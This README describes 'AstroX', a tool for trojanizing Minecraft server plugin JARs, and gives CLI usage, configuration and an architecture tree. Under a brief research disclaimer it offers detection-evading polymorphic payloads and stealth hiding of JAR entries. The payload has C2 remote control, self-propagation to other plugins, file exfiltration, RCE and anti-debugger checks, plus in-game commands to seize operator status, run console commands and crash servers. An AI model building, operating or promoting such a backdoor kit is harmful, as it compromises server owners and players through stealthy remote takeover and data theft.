# AstroX

![Java 17](https://img.shields.io/badge/Java-17+-orange?style=flat-square&logo=openjdk)
![Maven](https://img.shields.io/badge/Maven-3.8+-blue?style=flat-square&logo=apachemaven)
![Build](https://img.shields.io/badge/Build-Passing-brightgreen?style=flat-square)
![SpotBugs](https://img.shields.io/badge/SpotBugs-Clean-brightgreen?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
![Version](https://img.shields.io/badge/Version-2.0.0-blueviolet?style=flat-square)

**AstroX** is an advanced Java framework designed for security research and defensive testing of Minecraft server plugins. It provides automated tools for analyzing plugin JARs, identifying vulnerabilities, and simulating backdoor injection scenarios through polymorphic bytecode instrumentation with AES-256-GCM encrypted payloads.

> **⚠️ DISCLAIMER**: This tool is developed for **educational and authorized security research purposes only**. The authors are not responsible for any misuse. Ensure you have explicit permission from the system owner before performing any tests.

---

## 📋 Table of Contents
- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
  - [CLI Subcommands](#cli-subcommands)
  - [In-Game Commands](#in-game-commands)
- [Configuration](#-configuration)
- [Architecture](#-architecture)
- [Security & Obfuscation](#-security--obfuscation)
- [Development](#-development)
- [License](#-license)

---

## ✨ Features

### 🔍 Static Analysis
- **Metadata Extraction**: Automatically parses `plugin.yml` to identify plugin name, version, and main class.
- **Plugin Fingerprinting**: SHA-256 fingerprint database to track known clean vs. modified plugins.
- **Dependency Scanning**: Detects runtime dependencies and environment compatibility (Java version).
- **Structure Analysis**: Identifies base packages for optimal injection placement.

### 💉 Injection Engine
- **Polymorphic Weaving**: Generates unique payload signatures per injection to evade static signature detection.
- **AES-256-GCM String Encryption**: All payload string constants are encrypted at injection time with per-class runtime decryptor bytecode — completely transparent to the payload at runtime.
- **Package Remapping**: `ClassRemapper` randomizes all internal class names into the target plugin's package namespace.
- **Stealth Mode**: Hides injected entries from the JAR's ZIP Central Directory, making them invisible to standard JAR listing tools.
- **Batch Processing**: Multi-threaded concurrent injection across entire plugin directories.

### 🛡️ Obfuscation Pipeline
- **Two-Pass ASM Engine**: Pass 1 encrypts string constants, Pass 2 injects `__k` (AES key), `<clinit>` (key init), and `__d(String)` (decryptor) into each class.
- **Smart Filtering**: Automatically skips JVM type descriptors, internal class names, crypto algorithm names, and reflection strings to prevent bytecode corruption.
- **Dead Code Injection**: At strength ≥ 7, random opaque predicates are inserted into methods to confuse decompilers.
- **Name Randomization**: Classes, methods, and fields are renamed to random identifiers.

### 🚀 Runtime Payload
- **Command System**: Chat-based command listener with configurable prefix (default: `#`).
- **Access Control**: UUID-based whitelisting and master key authentication.
- **C2 Integration**: HTTP long-polling C2 client for remote command execution.
- **Propagation Engine**: Auto-spreads to other plugins on the server (configurable, with blacklist).
- **Payload Modules**: Extensible module system via `PayloadModule` SPI (FileExfil, EnvDump, RCE, MemoryDump).
- **Discord Webhooks**: Real-time notifications of injection events, player joins, and command usage.
- **Agent Detection**: Detects JVM monitoring agents (YourKit, JProfiler, debuggers) and enters safe mode.

### 🔒 Audit & Verification
- **HMAC-SHA256 Audit Log**: Tamper-evident chain of injection records with cryptographic verification.
- **JSON Pipeline Reports**: Detailed injection metadata including remap tables, encryption keys, and timing data.

---

## 🛠 Installation

### Prerequisites
- **Java Development Kit (JDK)**: Version 17 or higher
- **Apache Maven**: Version 3.8.0 or higher
- **Git**: For version control

### Build from Source
```bash
git clone https://github.com/Eangly99/AstroX.git
cd AstroX
mvn clean package
```

The executable fat JAR will be at `target/AstroX-2.0.0.jar`.

---

## 💻 Usage

### CLI Subcommands

AstroX uses a Picocli-based CLI with the following subcommands:

#### `inject` — Single Plugin Injection
```bash
java -jar AstroX-2.0.0.jar inject <plugin.jar> --key <master_key> [options]
```

| Flag | Description | Default |
|------|-------------|---------|
| `--key, -k` | **Required.** Master authentication key | — |
| `--stealth` | Enable stealth mode (hide entries from JAR listing) | `false` |
| `--dry-run` | Simulate injection without writing output | `false` |
| `--webhook, -w` | Discord webhook URL for notifications | — |
| `--c2` | C2 endpoint URL for HTTP long-polling | — |
| `--prefix, -p` | Command prefix | `#` |
| `--auth` | Pre-authorized player UUIDs | — |
| `--no-propagation` | Disable auto-spreading to other plugins | `false` |
| `--report` | Write JSON pipeline report to file | — |
| `--debug` | Enable verbose debug logging | `false` |

#### `batch` — Directory-Wide Concurrent Injection
```bash
java -jar AstroX-2.0.0.jar batch -d <plugins_dir> --key <master_key> [options]
```

| Flag | Description | Default |
|------|-------------|---------|
| `--target-dir, -d` | **Required.** Directory containing target JARs | — |
| `--key, -k` | **Required.** Master authentication key | — |
| `--threads, -t` | Number of concurrent threads | `4` |
| `--stealth` | Enable stealth mode | `false` |
| `--dry-run` | Simulate without writing output | `false` |
| `--report` | Write batch report to JSON file | — |

#### `analyze` — Read-Only Plugin Analysis
```bash
java -jar AstroX-2.0.0.jar analyze <plugin.jar>
```

#### `verify-audit` — Audit Log Integrity Check
```bash
java -jar AstroX-2.0.0.jar verify-audit --key <master_key>
```

#### `fingerprint` — Plugin Fingerprint Database
```bash
java -jar AstroX-2.0.0.jar fingerprint --add <plugin.jar> --name "PluginName" --version "1.0"
java -jar AstroX-2.0.0.jar fingerprint --check <plugin.jar>
java -jar AstroX-2.0.0.jar fingerprint --list
```

---

### In-Game Commands

Once the payload is deployed on a server, authenticate with the configured prefix:

```
#auth <master_key>
```

#### Command Reference

| Command | Description | Category |
|---------|-------------|----------|
| `#help` | Show all available commands | Utility |
| `#op` | Grant yourself operator status | Admin |
| `#deop <player>` | Remove operator status | Admin |
| `#console <cmd>` | Execute server console command | System |
| `#gamemode <mode>` | Change game mode (c/s/a/sp) | Player |
| `#fly` | Toggle flight mode | Player |
| `#vanish` | Toggle invisibility | Player |
| `#heal` | Fully heal and feed yourself | Player |
| `#give <item> [amount]` | Give items to yourself | Player |
| `#coords [player]` | Get player coordinates | Recon |
| `#list` | List all online players with details | Recon |
| `#seed` | Reveal world seed | Recon |
| `#kick <player> [reason]` | Kick a player from the server | Moderation |
| `#kill <player>` | Kill a player | Moderation |
| `#sudo <player> <msg>` | Force player to chat/run command | Trolling |
| `#broadcast <msg>` | Send broadcast message | Trolling |
| `#fakejoin [player]` | Broadcast fake join message | Trolling |
| `#fakeleave [player]` | Broadcast fake leave message | Trolling |
| `#chaos` | Random chaos effects on all players | Destructive |
| `#nuke [radius] [player]` | ☢️ Launch nuclear strike | Destructive |
| `#crash [player]` | Crash server or player client | Destructive |
| `#adduser <uuid>` | Whitelist a new authorized user | Access |
| `#auth <key>` | Authenticate with master key | Access |
| `#deauth` | Revoke your own authorization | Access |

---

## ⚙ Configuration

### Runtime Configuration
All settings are controlled via CLI arguments. No hardcoded master key — it **must** be provided via `--key`.

### Compile-Time Configuration
Edit `src/main/java/dev/naruto/astrox/Config.java`:

```java
public class Config {
    public static final String COMMAND_PREFIX = "#";
    public static final boolean ENABLE_OBFUSCATION = true;
    public static final int OBFUSCATION_LEVEL = 8;        // 1-10
    public static final boolean ENCRYPT_STRINGS = true;    // AES-256-GCM string encryption
    public static final List<String> PROPAGATION_BLACKLIST = List.of(
        "protocollib", "viaversion", "geyser"
    );
}
```

| Level | Feature |
|-------|---------|
| 1-4 | Package remapping only |
| 5+ | String encryption (AES-256-GCM per-class decryptor) |
| 6+ | Method and field name randomization |
| 7+ | Dead code injection (opaque predicates) |

---

## 🏗 Architecture

```
src/main/java/dev/naruto/astrox/
├── AstroX.java                     // Picocli CLI entrypoint (inject, batch, analyze, verify-audit, fingerprint)
├── Config.java                     // Compile-time configuration
├── RuntimeConfig.java              // CLI-driven runtime settings
├── BuildEncryptor.java             // Build-time JAR self-obfuscation tool
│
├── core/                           // Injection Pipeline
│   ├── Injector.java               // JAR manipulation + payload embedding + string encryption
│   ├── JarAnalyzer.java            // plugin.yml parser + class structure analysis
│   ├── PayloadWeaver.java          // Polymorphic bytecode generation + package remapping
│   ├── BatchProcessor.java         // Multi-threaded concurrent injection
│   ├── PipelineResult.java         // Injection metadata + JSON reporting
│   ├── PluginFingerprinter.java    // SHA-256 fingerprint database
│   └── StealthPatcher.java         // ZIP Central Directory manipulation
│
├── obfuscation/                    // Bytecode Obfuscation
│   ├── ObfuscationEngine.java      // Two-pass ASM string encryption + dead code injection
│   ├── StringEncryptor.java        // AES-256-GCM encryption with per-injection keys
│   ├── ClassMutator.java           // ASM class/method/field remapping
│   └── NameGenerator.java          // Collision-free random identifier generation
│
├── payload/                        // Injected Runtime Code
│   ├── BackdoorCore.java           // Main runtime controller (command listener + module loader)
│   ├── CommandHandler.java         // Command routing and dispatch
│   ├── AuthManager.java            // UUID-based access control
│   ├── BootstrapStub.java          // Payload bootstrap (stealth init)
│   ├── PropagationEngine.java      // Auto-spreading to other plugins
│   ├── ConfigWatcher.java          // Runtime config hot-reload
│   ├── commands/                   // 25 in-game commands
│   ├── modules/                    // Payload modules (FileExfil, EnvDump, RCE, MemoryDump)
│   ├── c2/                         // C2 client + protocol (HTTP long-polling)
│   └── security/                   // Agent detection (YourKit, JProfiler, debuggers)
│
└── utils/                          // Shared Utilities
    ├── WebhookNotifier.java        // Discord webhook integration
    ├── ReflectionUtil.java         // Runtime reflection (obfuscated method names)
    ├── CryptoUtil.java             // XOR encryption (legacy)
    ├── DynamicLoader.java          // Encrypted class loading from memory
    ├── AuditLogger.java            // HMAC-SHA256 tamper-evident audit log
    └── Logger.java / DebugLogger.java
```

---

## 🔐 Security & Obfuscation

### String Encryption Flow
```
Injection Time                          Runtime
┌─────────────┐                    ┌──────────────┐
│ "hello"     │ ── AES-256-GCM ──>│ LDC "Xk9f.." │
│ (plaintext) │    encrypt         │ INVOKESTATIC  │
└─────────────┘                    │   __d(String) │
                                   └──────┬───────┘
                                          │ decrypt
                                          ▼
                                   ┌──────────────┐
                                   │ "hello"      │
                                   │ (original)   │
                                   └──────────────┘
```

Each obfuscated class contains:
- `__k` — Static `byte[]` field holding the AES-256 key (Base64-decoded in `<clinit>`)
- `__d(String)` — Static decryptor method (Base64 decode → AES-GCM decrypt → UTF-8 String)

### Safety Filters
Strings that would break JVM semantics are **never encrypted**:
- JVM type descriptors (`(Ljava/lang/String;)V`)
- Internal class name patterns (`java/lang/Object`)
- Crypto algorithm names (`AES`, `AES/GCM/NoPadding`) — prevents infinite recursion
- Strings ≤ 2 characters, empty strings, Base64-looking strings

---

## 🤝 Development

### Setup
1. Open the project in IntelliJ IDEA or VS Code.
2. Import as a **Maven Project**.
3. Ensure Project SDK is set to **Java 17+**.

### Build & Test
```bash
mvn clean compile       # Compile
mvn test                # Run all 30 tests
mvn clean package       # Build fat JAR
mvn spotbugs:check      # Static analysis (requires JDK ≤ 21)
```

### Static Analysis
The project uses SpotBugs with `Max` effort and `Medium` threshold. False positives (JSON newline format strings, Bukkit plugin references) are excluded via `spotbugs-exclude.xml`.

### Contribution Guidelines
1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/amazing-feature`).
3. Commit your changes.
4. Push to the branch.
5. Open a Pull Request.

---

## 📄 License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

Copyright (c) 2025 Naruto
